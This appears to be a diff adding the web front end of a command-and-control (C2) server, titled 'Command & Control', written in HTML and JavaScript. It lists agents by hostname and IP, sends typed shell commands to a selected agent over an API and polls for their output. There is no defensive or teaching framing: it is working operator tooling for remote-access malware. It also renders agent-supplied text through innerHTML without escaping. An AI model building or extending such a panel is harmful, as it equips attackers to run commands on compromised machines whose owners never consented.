@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html class="h-full" lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>CONTROL PANEL</title>
+    <script src="https://cdn.tailwindcss.com?plugins=forms"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500&display=swap" rel="stylesheet"/>
+    
+    <style>
+        :root {
+            --bg: #050505;
+            --panel: #0a0a0a;
+            --border: #1f1f1f;
+            --accent: #410000;
+        }
+        body {
+            background-color: var(--bg);
+            color: #d1d1d1;
+            font-family: 'Fira Code', monospace;
+            overflow: hidden;
+            height: 100vh;
+        }
+        .custom-scrollbar::-webkit-scrollbar { width: 6px; height: 6px; }
+        .custom-scrollbar::-webkit-scrollbar-track { background: #000; }
+        .custom-scrollbar::-webkit-scrollbar-thumb { background: #555; border-radius: 3px; }
+
+        .terminal-line { font-size: 13.8px; line-height: 1.65; }
+        .agent-active { border-left: 3px solid var(--accent); background: #110000; }
+        
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+        .animate-entry { animation: fadeIn 0.35s ease-out forwards; }
+    </style>
+</head>
+<body class="flex flex-col h-screen">
+
+    
+    <header class="bg-black border-b border-[var(--border)] px-4 py-2.5 flex items-center justify-between text-xs flex-shrink-0">
+        <div class="flex items-center gap-4">
+            <span class="text-[#ff0000] font-bold tracking-widest text-xl">X</span>
+            <span class="text-zinc-500">Command & Control</span>
+        </div>
+    </header>
+
+    
+    <div class="flex h-96 border-b border-[var(--border)] flex-shrink-0">
+        <section class="w-3/5 border-r border-[var(--border)] flex flex-col">
+            <div class="bg-zinc-950 px-4 py-2 text-xs text-zinc-400 font-bold">ACTIVE AGENTS</div>
+            <div class="flex-1 overflow-auto custom-scrollbar p-3">
+                <table class="w-full text-left text-sm">
+                    <thead class="sticky top-0 bg-black text-zinc-500 border-b border-[var(--border)]">
+                        <tr>
+                            <th class="p-3">AGENT ID</th>
+                            <th class="p-3">HOSTNAME</th>
+                            <th class="p-3">IP</th>
+                            <th class="p-3">LAST SEEN</th>
+                        </tr>
+                    </thead>
+                    <tbody id="agent-list-body" class="text-zinc-300"></tbody>
+                </table>
+            </div>
+        </section>
+
+        <section class="w-2/5 flex flex-col">
+            <div class="bg-zinc-950 px-4 py-2 text-xs text-[#ff0000] font-bold">Events</div>
+            <div id="event-logs" class="flex-1 overflow-y-auto p-4 text-xs text-zinc-500 font-mono space-y-1 custom-scrollbar"></div>
+        </section>
+    </div>
+
+    
+    <div class="flex-1 flex flex-col min-h-0">
+        <div class="bg-zinc-950 px-4 py-2 text-xs text-zinc-400 font-bold flex justify-between">
+            <span>Console Output</span>
+            <span id="task-count" class="text-zinc-600 text-[10px]"></span>
+        </div>
+        
+        <div id="terminal-output" class="flex-1 overflow-y-auto p-5 space-y-6 terminal-line custom-scrollbar bg-[#0a0a0a]"></div>
+
+        
+        <div class="bg-black border-t border-[var(--border)] p-4 flex items-center gap-3 flex-shrink-0">
+            <span class="text-[#ff0000] text-2xl">→</span>
+            
+            <select id="agent-selector" 
+                    class="bg-transparent border border-[var(--border)] text-[#ff0000] px-3 py-2 text-sm focus:outline-none min-w-[200px]">
+                <option value="">Select Agent</option>
+            </select>
+
+            <input id="command-input" type="text" 
+                   class="flex-1 bg-transparent border border-[var(--border)] focus:border-[#ff0000] px-4 py-3 text-sm outline-none"
+                   placeholder="Enter command (whoami, dir, pwd, ls, shell whoami...)">
+        </div>
+    </div>
+
+    <script>
+        let lastResultId = 0;
+        const MAX_LINES = 70;
+
+        const agentListBody = document.getElementById('agent-list-body');
+        const agentSelector = document.getElementById('agent-selector');
+        const terminalOutput = document.getElementById('terminal-output');
+        const eventLogs = document.getElementById('event-logs');
+        const commandInput = document.getElementById('command-input');
+        const taskCountEl = document.getElementById('task-count');
+
+        async function loadAgents() {
+            try {
+                const res = await fetch('/api/v1/agents');
+                const agents = await res.json();
+
+                const currentAgent = agentSelector.value;
+
+                agentListBody.innerHTML = '';
+                agentSelector.innerHTML = '<option value="">SELECT AGENT</option>';
+
+                agents.forEach(agent => {
+                    const row = document.createElement('tr');
+                    row.className = `border-b border-[var(--border)] hover:bg-zinc-900 cursor-pointer ${currentAgent === agent.id ? 'agent-active' : ''}`;
+                    row.onclick = () => { 
+                        agentSelector.value = agent.id; 
+                        loadAgents(); 
+                    };
+                    row.innerHTML = `
+                        <td class="p-3 font-bold text-[#ff0000]">${agent.id}</td>
+                        <td class="p-3">${agent.hostname}</td>
+                        <td class="p-3 text-zinc-500">${agent.ip}</td>
+                        <td class="p-3 text-zinc-600">${new Date(agent.last_seen).toLocaleString()}</td>
+                    `;
+                    agentListBody.appendChild(row);
+
+                    const opt = document.createElement('option');
+                    opt.value = agent.id;
+                    opt.textContent = `${agent.id} — ${agent.hostname}`;
+                    if (agent.id === currentAgent) opt.selected = true;
+                    agentSelector.appendChild(opt);
+                });
+            } catch(e) { console.error(e); }
+        }
+
+        async function loadResults() {
+            try {
+                const res = await fetch('/api/v1/results');
+                const tasks = await res.json();
+
+                tasks.forEach(task => {
+                    if (task.id > lastResultId) {
+                        appendResult(task);
+                        lastResultId = task.id;
+                    }
+                });
+                taskCountEl.textContent = `Last Task: #${lastResultId}`;
+            } catch(e) { console.error(e); }
+        }
+
+        function appendResult(task) {
+            const div = document.createElement('div');
+            div.className = "animate-entry";
+
+            div.innerHTML = `
+                <div class="flex items-center gap-3 text-xs text-zinc-500 mb-1">
+                    <span class="bg-zinc-900 px-2 py-px rounded">${new Date().toLocaleTimeString()}</span>
+                    <span class="text-[#ff0000] font-bold">[${task.id}]</span>
+                    <span class="text-zinc-400">${task.command}</span>
+                </div>
+                <div class="pl-6 text-green-400 whitespace-pre-wrap font-mono text-[13.8px] border-l border-zinc-800">
+                    ${task.result ? task.result.replace(/\n/g, '<br>') : '[No output]'}
+                </div>
+            `;
+
+            terminalOutput.appendChild(div);
+
+            while (terminalOutput.children.length > MAX_LINES) {
+                terminalOutput.removeChild(terminalOutput.firstChild);
+            }
+
+            terminalOutput.scrollTop = terminalOutput.scrollHeight;
+        }
+
+        function logEvent(msg, color = "text-zinc-500") {
+            const div = document.createElement('div');
+            div.className = color;
+            div.innerHTML = `<span class="text-zinc-700">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
+            eventLogs.prepend(div);
+        }
+
+        
+        commandInput.addEventListener('keydown', async (e) => {
+            if (e.key === 'Enter') {
+                const cmd = commandInput.value.trim();
+                const agentId = agentSelector.value;
+
+                if (!cmd || !agentId) {
+                    logEvent("ERROR: Please select an agent first!", "text-red-500");
+                    return;
+                }
+
+                logEvent(`SENDING → ${agentId}: ${cmd}`, "text-yellow-400");
+
+                try {
+                    const res = await fetch('/api/v1/add-task', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ agent_id: agentId, command: cmd })
+                    });
+
+                    if (res.ok) {
+                        commandInput.value = '';   
+                        
+                    } else {
+                        logEvent("ERROR: Failed to send task", "text-red-500");
+                    }
+                } catch (err) {
+                    logEvent("ERROR: Unable to connect to server", "text-red-500");
+                }
+            }
+        });
+
+
+        setInterval(loadAgents, 6000);
+        setInterval(loadResults, 3000);
+
+        
+        loadAgents();
+        loadResults();
+        logEvent("C2 Control Panel initialized successfully", "text-green-500");
+    </script>
+</body>
+</html>
